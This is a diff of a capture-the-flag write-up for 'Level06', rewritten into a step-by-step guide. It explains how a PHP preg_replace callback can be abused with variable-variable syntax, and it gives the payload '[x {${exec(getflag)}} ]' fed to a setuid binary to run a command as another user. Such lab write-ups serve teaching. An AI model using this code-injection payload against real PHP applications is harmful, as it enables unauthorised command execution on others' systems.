@@ -1,8 +1,15 @@
-The binary file level06 and the php file level06.php are available in the home directory
+# Level06
 
-Contents of the php file :
+## Objective
+Exploit the PHP script `level06.php` to execute the `getflag` command as the owner (`flag06`) using code injection.
 
-```#!/usr/bin/php
+## Steps
+
+### Step 1: Examine PHP Script
+Review the contents of the PHP script `level06.php`:
+
+```php
+#!/usr/bin/php
 <?php
 function y($m) { 
     $m = preg_replace("/\./", " x ", $m);
@@ -17,17 +24,27 @@ function x($y, $z) {
     return $a;
 }
 $r = x($argv[1], $argv[2]); print $r;
-?>```
+?>
+```
 
--> flag06 is the owner of the file => we should exploit it to execute the getflag command
+### Step 2: Understand Code Injection
+The `x` function uses regular expressions to match the pattern `[x (code to execute)]`. To inject code, we need to create a temporary variable that will be evaluated.
 
-the first regex in x function match pattern [x (code to execute in the second capture group of regex)] 
+### Step 3: Create Payload
+Create a file in `/tmp` with the injected code:
 
-to inject code we must create a temp variable that will be evaluated : ```{${code here}}``` => variable variables
+```bash
+echo '[x {${exec(getflag)}} ]' > /tmp/getflag
+```
 
-to get code executed we can call 'system(getflag)' or 'exec(getflag)' or 'shell_exec(getflag)' and 'passthru(getflag)'
+### Step 4: Execute Level06 with Payload
+Run `./level06` with the created payload:
 
-[x {${exec(getflag)}} ] in a file edited with nano in tmp
+```bash
+./level06 /tmp/getflag
+```
 
-then ./level06 /tmp/getflag
-more info here : https://brightsec.com/blog/code-injection-php/#using-eval-function
+### Step 5: Obtain Flag
+The script should execute the injected code and print the flag.
+
+Congratulations! You've successfully exploited the PHP script to execute the `getflag` command and retrieve the flag.
